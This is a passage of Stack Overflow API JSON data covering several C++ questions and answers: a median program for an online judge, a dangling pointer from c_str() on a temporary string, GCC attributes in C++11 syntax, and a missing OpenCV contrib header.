"https://stackoverflow.com/users/4809967/yulonglong"}, "reply_to_user": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429785362, "post_id": 29816542, "comment_id": 47767973, "body": "And what do you mean by your number 616507? I was referring to the question number on the page when you submit your code?"}, {"owner": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429787439, "post_id": 29816542, "comment_id": 47769478, "body": "Hi steven ,thanks... this is the link of the problem <a href=\"https://icpcarchive.ecs.baylor.edu/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;problem=4977\" rel=\"nofollow noreferrer\">icpcarchive.ecs.baylor.edu/&hellip;</a>"}, {"owner": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429788417, "post_id": 29816542, "comment_id": 47770185, "body": "It&#39;s keeps showing wrong answer after trying your code!"}, {"owner": {"reputation": 86, "user_id": 4809967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3052af46b5500bebdb0ecdd672433fac?s=128&d=identicon&r=PG&f=1", "display_name": "yulonglong", "link": "https://stackoverflow.com/users/4809967/yulonglong"}, "reply_to_user": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429795379, "post_id": 29816542, "comment_id": 47775860, "body": "Hi again, I have no idea why is it wrong answer because it is definitely correct. I think it&#39;s because of the questions formatting ambiguity when the number of elements are even, when i have to sum 2 numbers and divide by 2. It is not stated to how many decimal places or integer?"}, {"owner": {"reputation": 86, "user_id": 4809967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3052af46b5500bebdb0ecdd672433fac?s=128&d=identicon&r=PG&f=1", "display_name": "yulonglong", "link": "https://stackoverflow.com/users/4809967/yulonglong"}, "reply_to_user": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429795489, "post_id": 29816542, "comment_id": 47775947, "body": "Anyway UVa Online judge is much better with bigger community. you should try that one instead in my opinion. Here is a similar problem with well defined requirement. <code>http:&#47;&#47;uva.onlinejudge.org&#47;index.php?option=onlinejudge&amp;page&zwnj;&#8203;=show_problem&amp;proble&zwnj;&#8203;m=1048</code> i can give you AC solution for that"}, {"owner": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "edited": false, "score": 0, "creation_date": 1429900258, "post_id": 29816542, "comment_id": 47835716, "body": "Ok.Thank you yulonglong!"}], "tags": [], "owner": {"reputation": 86, "user_id": 4809967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3052af46b5500bebdb0ecdd672433fac?s=128&d=identicon&r=PG&f=1", "display_name": "yulonglong", "link": "https://stackoverflow.com/users/4809967/yulonglong"}, "is_accepted": false, "score": 1, "last_activity_date": 1429795526, "last_edit_date": 1429795526, "creation_date": 1429774087, "answer_id": 29816542, "question_id": 29807190, "link": "https://stackoverflow.com/questions/29807190/median-program-through-uva/29816542#29816542", "title": "Median program through uva", "body": "<p>I would read all the numbers, store them in an array, then sort the array using <code>std::sort</code> in <code>&lt;algorithm&gt;</code></p>\n\n<p>Please find my code below:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;iostream&gt;\n#include &lt;algorithm&gt;\n\nint arr[10];\n\nint main()\n{\n    int N;\n    while ((std::cin &gt;&gt; N) &amp;&amp; (N!=-1)){\n        for(int i=0;i&lt;N;i++) {\n            std::cin &gt;&gt; arr[i];\n        }\n        std::sort(arr,arr+N);\n        if(N%2 == 1){\n            std::cout &lt;&lt; arr[N/2] &lt;&lt; std::endl;\n        }\n        else {\n            double ans = ((double)arr[N/2] + (double)arr[(N/2)-1]) / 2.0;\n            std::cout &lt;&lt; ans &lt;&lt; std::endl;\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>I hope it works for you.</p>\n\n<p>May I know the problem number? I will try to submit there and give you an AC solution.</p>\n"}], "owner": {"reputation": 411, "user_id": 1691075, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Kg1kX.jpg?s=128&g=1", "display_name": "Nada Ghanem", "link": "https://stackoverflow.com/users/1691075/nada-ghanem"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 54, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1429795526, "creation_date": 1429731254, "last_edit_date": 1429771158, "question_id": 29807190, "link": "https://stackoverflow.com/questions/29807190/median-program-through-uva", "title": "Median program through uva", "body": "<p>This is my first time using online judge, I tried a simple program to become familiar with the environment.</p>\n\n<p>Here is the <a href=\"https://icpcarchive.ecs.baylor.edu/external/69/6965.pdf\" rel=\"nofollow\">question</a>.</p>\n\n<p>I solved it as the following, but get a wrong answer!</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;math.h&gt;\n#include&lt;iostream&gt;\n\nint main()\n{\nint t;\nint n;\nint num[10];\nint i,j,temp;\nint s;\nint fmid;\nstd::cin &gt;&gt;t;\nint iter=0;\nwhile (iter&lt;t)\n{\nstd::cin&gt;&gt;n;\nif (n!=-1){\nfor(i=0;i&lt;n;i++)\nstd::cin&gt;&gt;num[i];\n\nfor( i=0;i&lt;n-1;i++)\n\nfor(j=i+1;j&lt;n;j++)\nif(num[i]&gt;num[j])\n{temp=num[i];\nnum[i]=num[j];\nnum[j]=temp;\n}\n\ns=0;\nif (n%2 ==0)\n{\nint mid=n/2-1;\nint  midd=mid+1;\n\ns=(num[mid]+num[midd])/2;\nfmid=s;\n}\n\nelse\n{s=ceil(n/2);\nfmid=num[s];}\n\nstd::cout&lt;&lt;fmid;\n}\niter++;\n\n}\n\nreturn 0;\n\n}\n</code></pre>\n\n<p>Any suggestion is much appreciated.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["c++", "string", "pointers", "visual-c++"], "comments": [{"owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "edited": false, "score": 1, "creation_date": 1429731208, "post_id": 29807131, "comment_id": 47742328, "body": "You are taking the address of a temporary object.  As soon as that line end the c-string will be destroyed and you have a dangling pointer."}, {"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 0, "creation_date": 1429731802, "post_id": 29807131, "comment_id": 47742732, "body": "The string returned from the call to GetString() only stays alive until the semicolon at the end of that line. The str_p pointer probably points to an internal field of that string which is about to be destroyed. If you want the string to stay alive (and so also the pointer returned by c_str() to remain valid) then assign the result to a named local first."}, {"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 1, "creation_date": 1429731871, "post_id": 29807131, "comment_id": 47742768, "body": "Also the casting away of const-ness is unnecessary and dangerous."}], "answers": [{"tags": [], "owner": {"reputation": 245138, "user_id": 2069064, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/e4V2X.jpg?s=128&g=1", "display_name": "Barry", "link": "https://stackoverflow.com/users/2069064/barry"}, "is_accepted": true, "score": 1, "last_activity_date": 1429731277, "creation_date": 1429731277, "answer_id": 29807202, "question_id": 29807131, "link": "https://stackoverflow.com/questions/29807131/how-to-get-string-data-back-using-pointer/29807202#29807202", "title": "How to get string data back using pointer?", "body": "<p>There is a lot wrong with this line:</p>\n\n<pre><code>char* str_p = const_cast&lt;char*&gt;(GetString().c_str());\n</code></pre>\n\n<p><code>GetString()</code> returns a temporary <code>string</code>. It gets destroyed at the end of the line. So you end up with a dangling pointer to internal data that was already deallocated. Furthermore, <code>const_cast</code> is something you should only ever be using if you <strong>really really really</strong> need it - editing data directly is just asking for trouble.</p>\n\n<p>If you want a pointer into that string, the right thing to do is:</p>\n\n<pre><code>string old = GetString();        // make sure it doesn't go out of scope\nconst char* str_p = old.c_str(); // while this pointer is around\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 4820977, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/9bo7g.jpg?s=128&g=1", "display_name": "DevCpp", "link": "https://stackoverflow.com/users/4820977/devcpp"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "accepted_answer_id": 29807202, "answer_count": 1, "score": -2, "last_activity_date": 1429731450, "creation_date": 1429731046, "question_id": 29807131, "link": "https://stackoverflow.com/questions/29807131/how-to-get-string-data-back-using-pointer", "title": "How to get string data back using pointer?", "body": "<p>I can not get my string data back using pointer to the char array. Could you give me an explanation what i am doing wrong please.</p>\n\n<pre><code>#include \"stdafx.h\"\n#include &lt;conio.h&gt;\n#include &lt;string&gt;\n\nusing namespace std;\n\nstring GetString()\n{\n    return string(\"255\");\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    char* str_p = const_cast&lt;char*&gt;(GetString().c_str());\n    printf(\"Pointer : %s\\n\", str_p);\n    string str;\n    str = str_p[0];\n    str += str_p[1];\n    str += str_p[2];\n    printf(\"Constructed : %s\\n\", str.c_str());\n\n    _getch();\n    return 0;\n}\n</code></pre>\n\n<p>The console output is :</p>\n\n<pre><code>Pointer :\nConstructed :\n</code></pre>\n"}, {"tags": ["c++", "c++11", "gcc", "attributes"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429730718, "post_id": 29807010, "comment_id": 47742015, "body": "Nothing is wrong. What makes you believe anything is wrong?"}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429730843, "post_id": 29807010, "comment_id": 47742090, "body": "@KerrekSB <i>&quot;What makes you believe anything is wrong?&quot;</i> That there&#39;s a warning applied about it of course. Why is it so?"}, {"owner": {"reputation": 493, "user_id": 4000536, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/065b5cda8359386cc6e8371a8015728c?s=128&d=identicon&r=PG&f=1", "display_name": "Andres Tiraboschi", "link": "https://stackoverflow.com/users/4000536/andres-tiraboschi"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429730899, "post_id": 29807010, "comment_id": 47742116, "body": "@KerrekSB : the fact that the attribute is being ignored"}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429731035, "post_id": 29807010, "comment_id": 47742198, "body": "@KerrekSB <i>&quot;I get that from my wife every day.&quot;</i> Those nagging daily annoyers :) ..."}, {"owner": {"reputation": 493, "user_id": 4000536, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/065b5cda8359386cc6e8371a8015728c?s=128&d=identicon&r=PG&f=1", "display_name": "Andres Tiraboschi", "link": "https://stackoverflow.com/users/4000536/andres-tiraboschi"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 1, "creation_date": 1429731038, "post_id": 29807010, "comment_id": 47742200, "body": "@KerrekSB : How do I do for that attribute not being ignored?"}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429731083, "post_id": 29807010, "comment_id": 47742230, "body": "Well, the support for attributes is implementation defined, so that&#39;s not by itself a problem. Maybe GCC doesn&#39;t support that attribute. Never mind that it supports a separate and distinct set of attributes as an extension via <code>__attribute__</code>. I guess the core of the question is whether GCC allows GCC attributes to be used as C++ attributes?"}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429731120, "post_id": 29807010, "comment_id": 47742262, "body": "@AndresTiraboschi <i>&quot;How do I do for that attribute not being ignored? &quot;</i> Use another toolchain that doesn&#39;t ignore it."}, {"owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "edited": false, "score": 0, "creation_date": 1429732261, "post_id": 29807010, "comment_id": 47743001, "body": "@AndresTiraboschi Every toolchain will ignore it, because that&#39;s the correct behaviour - such thing doesn&#39;t exist. If you need such non-standard attributes, you need to stick with compiler-specific solutions. I don&#39;t think GCC allows its <code>__attributes__</code> to be used with C++ 11 <code>[[...]]</code>syntax."}], "answers": [{"comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429731220, "post_id": 29807163, "comment_id": 47742341, "body": "Well, the C++ standard doesn&#39;t limit the number of supported attributes. It predefines a few (like <code>[[noreturn]]</code>), but it allows other attributes to exist with implementation-defined semantics."}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "reply_to_user": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 0, "creation_date": 1429731450, "post_id": 29807163, "comment_id": 47742471, "body": "@KerrekSB, that is interesting. Are there no reserved words or conversions similar to how it is with (library defined) user defined literals?"}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "reply_to_user": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "edited": false, "score": 0, "creation_date": 1429731514, "post_id": 29807163, "comment_id": 47742526, "body": "@JohanLundberg: I don&#39;t think so. See the link I added."}], "tags": [], "owner": {"reputation": 91345, "user_id": 481267, "user_type": "registered", "accept_rate": 68, "profile_image": "https://i.stack.imgur.com/DMvoo.png?s=128&g=1", "display_name": "Brian Bi", "link": "https://stackoverflow.com/users/481267/brian-bi"}, "is_accepted": false, "score": 2, "last_activity_date": 1429731134, "creation_date": 1429731134, "answer_id": 29807163, "question_id": 29807010, "link": "https://stackoverflow.com/questions/29807010/using-gcc-attributes-with-c11-attributes-syntax/29807163#29807163", "title": "Using gcc attributes with C++11 attributes syntax", "body": "<p>gcc attributes are not the same as the attributes introduced in C++11.</p>\n\n<p><code>used</code> is a gcc-specific attribute and should be introduced using the gcc attribute syntax, <code>__attribute__((used))</code>. There is no <code>[[used]]</code> attribute in standard C++, so gcc will simply ignore it.</p>\n"}, {"tags": [], "owner": {"reputation": 10555, "user_id": 2812864, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/GVsZM.jpg?s=128&g=1", "display_name": "Mateusz Grzejek", "link": "https://stackoverflow.com/users/2812864/mateusz-grzejek"}, "is_accepted": false, "score": 4, "last_activity_date": 1429731804, "last_edit_date": 1429731804, "creation_date": 1429731338, "answer_id": 29807216, "question_id": 29807010, "link": "https://stackoverflow.com/questions/29807010/using-gcc-attributes-with-c11-attributes-syntax/29807216#29807216", "title": "Using gcc attributes with C++11 attributes syntax", "body": "<p>There is no <code>[[used]]</code> attribute in C++ 11, that's why it's being ignored. <strong>(*)</strong></p>\n\n<p>There is gcc-specific <code>__attribute__((used))</code>, that can be applied to static object or function definitions. It tells compiler to emit definitions, even if that symbol seems to be unused at all - in other words, it makes you sure, that such symbol will be present in result object file.</p>\n\n<hr>\n\n<p><strong>(*)</strong> It needs to be ignored, because standard allows implementations to define additional, implementation-specific attributes. So there is no point in treating unknown attributes as an error (similar case: <code>#pragma</code> directives).</p>\n\n<hr>\n\n<p>Some additional info:</p>\n\n<blockquote>\n  <p>Attributes provide the unified standard syntax for implementation-defined language extensions, such as the GNU and IBM language extensions <code>__attribute__((...))</code>, Microsoft extension <code>__declspec()</code>, etc. </p>\n</blockquote>\n\n<p>And, probably the most important part:</p>\n\n<blockquote>\n  <p>Only the following attributes are defined by the C++ standard. All other attributes are implementation-specific.</p>\n  \n  <ul>\n  <li><code>[[noreturn]]</code></li>\n  <li><code>[[carries_dependency]]</code></li>\n  <li><code>[[deprecated]]</code> <em>(C++14)</em></li>\n  <li><code>[[deprecated(\"reason\")]]</code> <em>(C++14)</em></li>\n  </ul>\n</blockquote>\n\n<p>Source: <a href=\"http://en.cppreference.com/w/cpp/language/attributes\" rel=\"nofollow\">attribute specifier sequence</a>.</p>\n"}, {"tags": [], "owner": {"reputation": 6533, "user_id": 1918193, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4b70a14318e0f417ecac47809f38fafc?s=128&d=identicon&r=PG", "display_name": "Marc Glisse", "link": "https://stackoverflow.com/users/1918193/marc-glisse"}, "is_accepted": true, "score": 12, "last_activity_date": 1429740415, "creation_date": 1429740415, "answer_id": 29809787, "question_id": 29807010, "link": "https://stackoverflow.com/questions/29807010/using-gcc-attributes-with-c11-attributes-syntax/29809787#29809787", "title": "Using gcc attributes with C++11 attributes syntax", "body": "<pre><code>[[gnu::used]] static void foo(void) {}\n</code></pre>\n\n<p>First, the attribute can only appear in specific places, otherwise you get:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>x.cc:1:13: warning: attribute ignored [-Wattributes]\n static void [[gnu::used]] foo(void) {}\n             ^\nx.cc:1:13: note: an attribute that appertains to a type-specifier is ignored\n</code></pre>\n\n<p>Second, <code>used</code> is not a standard warning, so it gets hidden in a proprietary namespace <code>gnu::</code>.</p>\n"}], "owner": {"reputation": 493, "user_id": 4000536, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/065b5cda8359386cc6e8371a8015728c?s=128&d=identicon&r=PG&f=1", "display_name": "Andres Tiraboschi", "link": "https://stackoverflow.com/users/4000536/andres-tiraboschi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6348, "favorite_count": 2, "accepted_answer_id": 29809787, "answer_count": 3, "score": 8, "last_activity_date": 1429740415, "creation_date": 1429730617, "last_edit_date": 1429731400, "question_id": 29807010, "link": "https://stackoverflow.com/questions/29807010/using-gcc-attributes-with-c11-attributes-syntax", "title": "Using gcc attributes with C++11 attributes syntax", "body": "<p>I was trying to use the <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html#Function-Attributes\" rel=\"noreferrer\">GCC attributes</a> with the <a href=\"http://en.cppreference.com/w/cpp/language/attributes\" rel=\"noreferrer\">C++11 syntax</a>. For example something like this:</p>\n\n<pre><code>static void [[used]] foo(void)\n{\n    // ...\n}\n</code></pre>\n\n<p>But I get the following:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>warning: \u2018used\u2019 attribute ignored [-Wattributes]\nstatic void [[used]] foo(void)\n            ^\n</code></pre>\n\n<p>Why is the attribute ignored? Is it possible to use GCC attributes as C++ attributes?</p>\n"}, {"tags": ["c++", "opencv", "include"], "comments": [{"owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 0, "creation_date": 1429730174, "post_id": 29806834, "comment_id": 47741662, "body": "Also, I know that if the file was in the include directory I would have to change the path, but it still was not there anyways."}], "answers": [{"comments": [{"owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 1, "creation_date": 1429730614, "post_id": 29806967, "comment_id": 47741945, "body": "Is there no way to add this functionality to my current build?"}, {"owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 0, "creation_date": 1429730965, "post_id": 29806967, "comment_id": 47742152, "body": "Thanks, can you add instructions for this re-build to your answer? I think it will help my self and the SO community"}, {"owner": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "reply_to_user": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 2, "creation_date": 1429731208, "post_id": 29806967, "comment_id": 47742327, "body": "hmm, try the <a href=\"https://github.com/Itseez/opencv_contrib\" rel=\"nofollow noreferrer\">instructions</a> , and come back, when (and where) it did not work for you ?"}, {"owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 0, "creation_date": 1429737397, "post_id": 29806967, "comment_id": 47746104, "body": "The build worked. However, now I am receiving errors similar to <a href=\"http://stackoverflow.com/questions/28863538/no-member-named-getmat-in-cvfacefacerecognizer\" title=\"no member named getmat in cvfacefacerecognizer\">stackoverflow.com/questions/28863538/&hellip;</a>"}, {"owner": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "reply_to_user": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "edited": false, "score": 0, "creation_date": 1429766982, "post_id": 29806967, "comment_id": 47756299, "body": "please make sure to use the updated sample code from opencv_contrib, not something older you found on SO or such."}], "tags": [], "owner": {"reputation": 35699, "user_id": 2056772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/574eff69e66401997eecd2ac405053c1?s=128&d=identicon&r=PG", "display_name": "berak", "link": "https://stackoverflow.com/users/2056772/berak"}, "is_accepted": false, "score": 9, "last_activity_date": 1452626944, "last_edit_date": 1452626944, "creation_date": 1429730479, "answer_id": 29806967, "question_id": 29806834, "link": "https://stackoverflow.com/questions/29806834/fatal-error-opencv2-contrib-contrib-hpp-file-not-found-open-cv-already-built/29806967#29806967", "title": "fatal error: opencv2/contrib/contrib.hpp&#39; file not found (open cv already built)", "body": "<p>Since you're obviously using opencv3.0:</p>\n\n<p>the contrib parts have been outsourced to a <a href=\"https://github.com/Itseez/opencv_contrib\" rel=\"noreferrer\">separate github repo</a></p>\n\n<p>You'll have to get that, append it to your main opencv (re-)build, and then:</p>\n\n<pre><code>   #include &lt;opencv2/face.hpp&gt;\n   using namespace cv;\n   Ptr&lt;face::FaceRecognizer&gt; model = face::createLBPHFaceRecognizer(...)\n</code></pre>\n\n<p>(an additional namespace was added here)</p>\n"}], "owner": {"reputation": 6350, "user_id": 2399935, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/0dba94ea111afa694c3615b18bea3589?s=128&d=identicon&r=PG&f=1", "display_name": "Brian", "link": "https://stackoverflow.com/users/2399935/brian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 14492, "favorite_count": 4, "answer_count": 1, "score": 6, "last_activity_date": 1452626944, "creation_date": 1429729983, "last_edit_date": 1495541891, "question_id": 29806834, "link": "https://stackoverflow.com/questions/29806834/fatal-error-opencv2-contrib-contrib-hpp-file-not-found-open-cv-already-built", "title": "fatal error: opencv2/contrib/contrib.hpp&#39; file not found (open cv already built)", "body": "<p>I have downloaded and built open cv according to these <a href=\"http://docs.opencv.org/3.0-last-rst/doc/tutorials/introduction/linux_install/linux_install.html\" rel=\"nofollow noreferrer\">open cv docs</a>.</p>\n\n<p>I am trying to compile this <a href=\"http://docs.opencv.org/modules/contrib/doc/facerec/facerec_tutorial.html\" rel=\"nofollow noreferrer\">Eigenfaces demo</a>, and I am getting the following error.</p>\n\n<pre><code>fatal error: 'opencv2/contrib/contrib.hpp' file not found\n</code></pre>\n\n<p>The line of concern is</p>\n\n<pre><code>#include \"opencv2/contrib/contrib.hpp\"\n</code></pre>\n\n<p>The contrib directory is not in my <code>usr/local/include/opencv/</code> directory. I have referenced the following <a href=\"https://stackoverflow.com/questions/28222067/mac-osx-build-opencv-contrib-fatal-error-file-not-found-opencv2-core-hpp\">SO Question</a>, but it seems to only handle the case of building from scratch.</p>\n\n<p>Also, the repository that it references <a 